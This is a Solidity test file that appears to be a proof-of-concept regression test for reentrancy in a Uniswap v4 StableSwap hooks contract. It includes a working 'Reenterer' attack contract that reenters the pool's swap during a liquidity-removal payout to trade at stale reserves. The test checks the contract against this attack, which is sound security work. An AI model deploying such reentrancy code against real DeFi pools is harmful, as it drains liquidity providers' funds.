// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.30;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {BalanceDelta, BalanceDeltaLibrary} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";

import {Base} from "src/Base.sol";
import {StableSwapHooks} from "src/StableSwapHooks.sol";
import {StableSwapHooksFactoryHarness} from "test/testUtils/StableSwapHooksFactoryHarness.sol";
import {ExternalContractsDeployer} from "test/testUtils/ExternalContractsDeployer.sol";
import {MockERC20} from "test/scenarios/mocks/MockERC20.sol";

contract RemoveLiquidityReentrancyPoC is ExternalContractsDeployer {
    uint256 internal constant LP_FEE_PERCENTAGE = 300;
    uint256 internal constant AMP = 100;
    uint256 internal constant HONEST_LIQUIDITY = 10_000 ether;
    uint256 internal constant ATTACKER_LIQUIDITY = 990_000 ether;
    uint256 internal constant REENTRANT_ETH_OUT = 9_999 ether;

    StableSwapHooksFactoryHarness internal factory;
    StableSwapHooks internal hooks;
    MockERC20 internal token;
    Currency internal nativeEth;
    Currency internal tokenCurrency;

    function setUp() public override {
        super.setUp();

        nativeEth = Currency.wrap(address(0));
        token = new MockERC20("Mock Token", "MOCK", 18);
        tokenCurrency = Currency.wrap(address(token));

        factory = new StableSwapHooksFactoryHarness(
            IPoolManager(poolManager),
            makeAddr("admin"),
            makeAddr("protocolFeeCollector"),
            makeAddr("hookFeeCollector"),
            keccak256(type(StableSwapHooks).creationCode)
        );

        hooks = _deployHooks();

        address honestLp = makeAddr("honestLp");
        vm.deal(honestLp, HONEST_LIQUIDITY);
        token.mint(honestLp, HONEST_LIQUIDITY);
        vm.startPrank(honestLp);
        token.approve(address(hooks), type(uint256).max);
        hooks.addLiquidity{value: HONEST_LIQUIDITY}(_amounts(HONEST_LIQUIDITY, HONEST_LIQUIDITY), new uint256[](2), 0);
        vm.stopPrank();
    }

    function test_ReentrancyThroughRemoveLiquidityShouldNotBeExploitable() public {
        Reenterer attacker =
            new Reenterer(hooks, IPoolManager(poolManager), IERC20(address(token)), _poolKey(), REENTRANT_ETH_OUT);

        vm.deal(address(attacker), ATTACKER_LIQUIDITY);
        token.mint(address(attacker), ATTACKER_LIQUIDITY + 200_000 ether);

        attacker.addLiquidity{value: ATTACKER_LIQUIDITY}(_amounts(ATTACKER_LIQUIDITY, ATTACKER_LIQUIDITY));
        attacker.removeAllAndReenter();

        assertEq(
            attacker.observedEthReserve(),
            HONEST_LIQUIDITY,
            "reentrant swap saw stale pre-removal reserves: shares/reserves not updated before payout"
        );
        assertGt(
            attacker.tokenPaid(),
            100_000 ether,
            "reentrant swap got a near-1:1 stale-reserve price instead of the fair post-removal price"
        );
    }

    function _deployHooks() internal returns (StableSwapHooks) {
        Currency[] memory currencies = new Currency[](2);
        currencies[0] = nativeEth;
        currencies[1] = tokenCurrency;

        Base.RateOracleConfig[] memory rateOracles = new Base.RateOracleConfig[](2);
        rateOracles[0] = Base.RateOracleConfig({oracle: address(0), selector: bytes4(0)});
        rateOracles[1] = Base.RateOracleConfig({oracle: address(0), selector: bytes4(0)});

        bytes memory code = type(StableSwapHooks).creationCode;
        (, bytes32 salt) = factory.mineSalt(currencies, rateOracles, LP_FEE_PERCENTAGE, AMP, code);

        return StableSwapHooks(factory.deploy(currencies, rateOracles, LP_FEE_PERCENTAGE, AMP, salt, code));
    }

    function _poolKey() internal view returns (PoolKey memory) {
        return PoolKey({
            currency0: nativeEth,
            currency1: tokenCurrency,
            fee: uint24(LP_FEE_PERCENTAGE),
            tickSpacing: hooks.TICK_SPACING(),
            hooks: IHooks(address(hooks))
        });
    }

    function _amounts(uint256 ethAmount, uint256 tokenAmount) internal pure returns (uint256[] memory amounts) {
        amounts = new uint256[](2);
        amounts[0] = ethAmount;
        amounts[1] = tokenAmount;
    }
}

/// @dev Removes all of its liquidity and, when the pool pays out native ETH, reenters
///      PoolManager.swap. Records the ETH reserve and token cost seen during reentry so the
///      test can assert the swap is priced against the updated post-removal reserves.
contract Reenterer {
    using BalanceDeltaLibrary for BalanceDelta;
    using SafeERC20 for IERC20;

    StableSwapHooks internal immutable hooks;
    IPoolManager internal immutable poolManager;
    IERC20 internal immutable token;
    uint256 internal immutable ethOut;
    PoolKey internal poolKey;

    uint256 public observedEthReserve;
    uint256 public tokenPaid;

    constructor(
        StableSwapHooks _hooks,
        IPoolManager _poolManager,
        IERC20 _token,
        PoolKey memory _poolKey,
        uint256 _ethOut
    ) {
        hooks = _hooks;
        poolManager = _poolManager;
        token = _token;
        poolKey = _poolKey;
        ethOut = _ethOut;
        _token.approve(address(_hooks), type(uint256).max);
    }

    function addLiquidity(uint256[] calldata amounts) external payable {
        hooks.addLiquidity{value: msg.value}(amounts, new uint256[](2), 0);
    }

    function removeAllAndReenter() external {
        hooks.removeLiquidity(hooks.balanceOf(address(this)), new uint256[](2));
    }

    receive() external payable {
        // Reenter only on the removal payout, not on the nested swap's own ETH take.
        if (observedEthReserve != 0) {
            return;
        }

        observedEthReserve = hooks.reserves(0);

        BalanceDelta delta = poolManager.swap(
            poolKey,
            SwapParams({
                zeroForOne: false, amountSpecified: int256(ethOut), sqrtPriceLimitX96: TickMath.MAX_SQRT_PRICE - 1
            }),
            ""
        );

        tokenPaid = uint128(-delta.amount1());

        poolManager.sync(poolKey.currency1);
        token.safeTransfer(address(poolManager), tokenPaid);
        poolManager.settle();
        poolManager.take(poolKey.currency0, address(this), uint128(delta.amount0()));
    }
}
